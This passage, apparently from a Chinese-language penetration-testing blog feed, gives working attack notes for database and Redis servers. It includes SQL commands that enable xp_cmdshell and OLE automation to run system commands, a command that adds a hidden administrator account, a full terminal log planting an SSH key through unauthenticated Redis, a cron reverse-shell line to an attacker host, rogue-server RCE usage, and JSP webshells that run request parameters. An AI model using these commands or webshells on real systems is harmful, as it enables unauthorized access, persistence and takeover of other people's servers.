retuns string soname “xxx.dll”;</p></blockquote><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>比较老了，权当了解学习：<a href="https://www.cnblogs.com/zzjdbk/p/12991468.html">参考</a></p><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）</p><p>叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡</p><blockquote><p>MOF文件既然每五秒就会执行，而且是系统权限；</p><p>我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；</p><p>然后系统每隔五秒就会执行一次我们上传的MOF。</p><p>MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p></blockquote><p>这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权。</p><p><strong>条件：</strong></p><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span>&lt;=<span class="hljs-number">2003</span><br></code></pre></td></tr></table></figure><p>mysql在c:/windows/system32/wbem/mof目录有写权限</p><p>已知数据库root账号密码</p><p>数据库允许外连</p><p>secure_file_priv为空</p></blockquote><p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看secure_file_priv的值</span><br>SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br><br><span class="hljs-comment">#这个值可以在my.ini设置为空</span><br>secure_file_priv =<br></code></pre></td></tr></table></figure><p><strong>MSF 下有Mof 提权模块</strong></p><p>执行成功后会直接反弹一个 <code>system</code>权限的meterpreter </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/mysql/mysql_mof<br></code></pre></td></tr></table></figure><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p><strong>首先查看权限</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--是否sa权限，返回 1 就是sa</span><br><span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>)<br><br><span class="hljs-comment">--是否dba权限，返回 1 就是DBA</span><br><span class="hljs-keyword">select</span> IS_MEMBER(<span class="hljs-string">&#x27;db_owner&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><blockquote><p><strong>适用(xp\2000\2003系统)</strong></p><p>前提是MSSQL是以system用户运行的，才能提权；</p><p>如果用nt authority\network service运行，是没有系统权限的。</p></blockquote><p>默认情况下是关闭的，用下边的命令开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">--允许修改高级参数</span><br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">--打开xp_cmdshell扩展</span><br>RECONFIGURE;<br></code></pre></td></tr></table></figure><p>如果xp_cmdshell被删除，可以尝试上传<code>xplog70.dll</code> <a href="https://fix4dll.com/xplog70_dll">https://fix4dll.com/xplog70_dll</a> 进行恢复，恢复语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Exec</span> master.dbo.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-string">&#x27;c:\\xplog70.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="sa提权登RDP"><a href="#sa提权登RDP" class="headerlink" title="sa提权登RDP"></a>sa提权登RDP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;net use \\192.168.10.133\ipc$ mcc5@133 /user:192.168.10.133\administrator&amp;&amp; copy \\192.168.10.133\c$\users\public\videos\sweetpotato.exe c:\users\public\videos\s.exe&#x27;</span><br><br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;c:\users\public\videos\s.exe -a &quot;whoami&quot;&#x27;</span><br><br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;c:\users\public\videos\s.exe -a &quot;net user admin$ @admin.886 /add&amp;net localgroup administrators admin$ /add&quot;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="SP-OACreate"><a href="#SP-OACreate" class="headerlink" title="SP_OACreate"></a>SP_OACreate</h3><blockquote><p><strong>适用(xp\2000\2003系统)</strong></p></blockquote><p>当xp_cmdshell 删除以后，还可以使用SP_OACreate</p><p>打开组件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--开启EXEC</span><br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><br><span class="hljs-comment">--关闭EXEC</span><br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span>;<br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">0</span>;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></code></pre></td></tr></table></figure><p>这种方式是无回显的，打开1.txt查看命令执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\\1.txt<br></code></pre></td></tr></table></figure><h3 id="openrowset沙盒"><a href="#openrowset沙盒" class="headerlink" title="openrowset沙盒"></a>openrowset沙盒</h3><blockquote><p><strong>(2003系统可用、2012-r2实验失败)</strong></p></blockquote><p>首先检查cmd_shell是否开启：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br><span class="hljs-comment">--结果为 1 就是开启</span><br></code></pre></td></tr></table></figure><p>开启默认关闭的xp_regwrite存储过程：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--开启</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span> ,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span> ,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span> ,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span> ,<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br><br><span class="hljs-comment">--利用完后恢复</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure><p>利用jet.oledb执行系统命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span> ,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span> ,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c whoami &gt; c:\\666.txt&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个也是无回显的</p><p>沙盒模式SandBoxMode参数含义（默认是2）：</p><blockquote><p><code>0</code>：在任何所有者中禁止启用安全模式</p><p><code>1</code> ：为仅在允许范围内</p><p><code>2</code> ：必须在access模式下</p><p><code>3</code>：完全开启</p></blockquote><p>openrowset是可以通过OLE DB访问SQL Server数据库</p><p>OLE DB是应用程序链接到SQL Server的的驱动程序</p><h2 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h2><p><a href="https://github.com/jas502n/oracleShell">工具</a></p><h2 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h2><p>CVE-2018-1058  CVE-2019-9193</p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>主要是指未授权访问：写ssh-keygen登录、写计划任务反弹shell、写webshell、主从复制</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提权是一项很考验综合能力的渗透环节，需要长时间的积累与练习，这笔记有点潦草和凌乱，知识点复杂繁多，将不断更新</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问</title>
    <link href="/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/twosmi1e/p/13308682.html">https://www.cnblogs.com/twosmi1e/p/13308682.html</a></p><h2 id="写ssh-keygen登录"><a href="#写ssh-keygen登录" class="headerlink" title="写ssh-keygen登录"></a>写ssh-keygen登录</h2><p>先决条件：目标root账号启动redis服务，开放ssh服务，允许<a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">密钥</a>登录</p><ol><li>生成公私钥</li></ol><blockquote><p>ssh-keygen -t rsa</p></blockquote><ol start="2"><li>处理公钥</li></ol><blockquote><p>(echo -e “\n\n”;cat id_rsa.pub; echo -e “\n\n”) &gt; 1.txt</p></blockquote><ol start="3"><li>写入公钥到redis服务器</li></ol><blockquote><p>cat 1.txt | redis-cli -h 192.168.254.130 -x set pub</p></blockquote><ol start="4"><li>登录</li></ol><blockquote><p>redis-cli -h 192.168.254.130</p></blockquote><ol start="5"><li>查看redis备份路径</li></ol><blockquote><p>config get dir</p></blockquote><ol start="6"><li>篡改路径为ssh公钥存放(/root/.ssh/)</li></ol><blockquote><p>config set dir /root/.ssh/</p></blockquote><ol start="7"><li>设置上传公钥备份文件名字为authorized_keys：</li></ol><blockquote><p>config set dbfilename authorized_keys</p></blockquote><ol start="8"><li>保存退出</li></ol><blockquote><p>save</p><p>exit</p></blockquote><p>ssh免密登录redis服务器：</p><blockquote><p>ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x33;&#48;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#53;&#x34;&#46;&#x31;&#x33;&#48;</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">──(root💀c)-[~]<br>└─# ssh-keygen -t rsa                          <br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_rsa<br>Your public key has been saved in /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:N0MqLY84OiIS0KYJ2zIQe7SMBSSmIJHszo3ueKWaR6A root@192.168.254.128<br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|O*               |<br>|O.o              |<br>|oO .      .      |<br>|B.*    . o       |<br>|BOo   o S +      |<br>|E+o... = . o     |<br>|.= oo . .        |<br>|=o=. .           |<br>|B*..             |<br>+----[SHA256]-----+<br>                                                                             <br>┌──(root💀192)-[~]<br>└─# cd .ssh/<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# ls<br>id_rsa  id_rsa.pub<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# (echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt;1.txt<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# cat 1.txt | redis-cli -h 192.168.254.130 -x set file <br>OK<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# redis-cli -h 192.168.254.130<br>192.168.254.130:6379&gt; config get dir<br>1) &quot;dir&quot;<br>2) &quot;/root/redis-2.8.17/src&quot;<br>192.168.254.130:6379&gt; config set dir /root/.ssh/<br>OK<br>192.168.254.130:6379&gt; config get dbfilename<br>1) &quot;dbfilename&quot;<br>2) &quot;dump.rdb&quot;<br>192.168.254.130:6379&gt; config set dbfilename authorized_keys<br>OK<br>192.168.254.130:6379&gt; save<br>OK<br>192.168.254.130:6379&gt; exit<br>                                                                             <br>┌──(root💀192)-[~/.ssh]<br>└─# ssh -i id_rsa root@192.168.254.130 -p 22888<br>The authenticity of host &#x27;[192.168.254.130]:22888 ([192.168.254.130]:22888)&#x27; can&#x27;t be established.<br>ECDSA key fingerprint is SHA256:Zopc14FUvhzjh0dHrhIok+KREN4hXhbm2NNkyuMDXbw.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;[192.168.254.130]:22888&#x27; (ECDSA) to the list of known hosts.<br>Last login: Thu Mar 24 09:21:28 2022 from 192.168.254.128<br>[root@centos7 ~]#                   <br></code></pre></td></tr></table></figure><h2 id="写计划任务反弹shell"><a href="#写计划任务反弹shell" class="headerlink" title="写计划任务反弹shell"></a>写计划任务反弹shell</h2><p>ubuntu下可以利用的cron有以下几个地方：</p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600</code></pre><p>CentOS下计划任务文件</p><pre><code>/etc/crontab：该文件里面的任务计划可以直接执行/var/spool/cron/root：该文件里面的任务计划可以直接执行</code></pre><p>和写ssh-keygen方法一样</p><blockquote><p>set x “\n* * * * * bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\n”     //* * * * * 每一分钟执行一次</p><p>config set dir /var/spool/cron</p><p>config set dbfilename root</p><p>save</p></blockquote><p>Ubuntu下：</p><ol><li>如果写<code>/etc/crontab</code>和<code>/etc/cron.d</code>，由于存在乱码，语法不识别，会导致ubuntu不能正确识别，导致定时任务失败。</li><li>如果写<code>/var/spool/cron/crontabs/root</code>，权限是644，ubuntu不能运行。</li></ol><blockquote><p>crontab反弹debian,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行<code>crontab -u root /var/spool/cron/crontabs/root</code>通过语法检查后，才能执行计划任务。</p></blockquote><p>所以当渗透系统为ubuntu/debian且是低权限时，不优先考虑写计划任务</p><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>略</p><p>redis-4.0.10 之前的版本 Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><p>redis-4.0.10 之后的版本 默认开启了保护模式，仅允许本地无密码验证连接。如果要利用，可能就要考虑弱口令和配置错误了。</p><p>实战在生产环境下用还是会有很多问题的</p><ol><li>redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</li><li>Ubuntu，Debian写计划任务反弹无用</li><li>写/etc/passwd会覆盖原有/etc/passwd，不可能改了再改回来</li><li>生产环境下用<code>KEY *</code> 这样的命令直接炸</li></ol><h2 id="主从复制getshell"><a href="#主从复制getshell" class="headerlink" title="主从复制getshell"></a>主从复制getshell</h2><p>脚本一：</p><p><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p><p>vps：</p><blockquote><p>python3 redis-rogue-server.py -v -lport 80 -path exp.so</p></blockquote><p>redis-cli连接redis服务</p><p>计划任务以及ssh_keygen不可写时，写/tmp</p><blockquote><p>config set dir /tmp</p><p>config set dbfilename exp.so</p></blockquote><p>设置主从关系</p><blockquote><p>slaveof vps 80</p></blockquote><p>导入模块</p><blockquote><p>module load exp.so</p><p>module list //出现如下即成功：</p><ol><li><ol><li>“name”</li><li>“system”</li><li>“ver”</li><li>(integer) 1</li></ol></li></ol></blockquote><p>反弹shell：</p><blockquote><p>nv -lnvp 2333</p><p>system.rev vps 2333</p></blockquote><p>脚本二：</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>有两个模式</p><blockquote><p>python3 redis-rogue-server.py –rhost 123.58.236.76 –rport 6379 –lhost vps –lport 443 -v (默认：–exp=exp.so)</p></blockquote><p>i进入交互，r反弹shell</p><p>脚本三：</p><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><blockquote><p>python3 redis-rce.py -r 172.20.0.1 -L 127.0.0.1 -P 80 -f module.so</p></blockquote><p>同上</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CE&amp;Reflection</title>
    <link href="/2022/03/24/CE&amp;Reflection/"/>
    <url>/2022/03/24/CE&amp;Reflection/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行-amp-反射"><a href="#命令执行-amp-反射" class="headerlink" title="命令执行&amp;反射"></a>命令执行&amp;反射</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>无回显：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        BufferedReader br = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Process p = Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br>            br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>            String line = <span class="hljs-keyword">null</span>;<br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                sb.append(line + <span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            System.out.println(sb.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (br != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    br.close();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写成 jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))%&gt;<br></code></pre></td></tr></table></figure><p>在 Tomcat 9 显示：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324192141823.png"></p><p>在 Tomcat 8 显示：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324192209758.png"></p><p>添加回显：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">byte</span>[] b =<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>    out.println(<span class="hljs-keyword">new</span> String(b));<br>&#125;<br>out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<br>    InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>    ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>    <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> 